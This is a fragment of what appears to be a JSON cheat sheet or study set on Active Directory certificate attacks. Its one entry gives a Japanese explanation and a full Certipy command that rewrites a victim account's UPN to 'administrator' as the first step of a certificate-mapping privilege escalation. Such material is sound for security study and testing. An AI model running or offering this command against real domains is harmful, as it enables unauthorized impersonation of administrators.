        "tool": "Certipy",
        "t": "Case1(Kerberos互換マッピング)の起点。被害者のUPNをadministratorへ書換え、通常テンプレートを申請できる状態を作る",
        "q": "certipy account update -u svc_user@corp.local -p 'Passw0rd!' -user victim -upn administrator@corp.local"
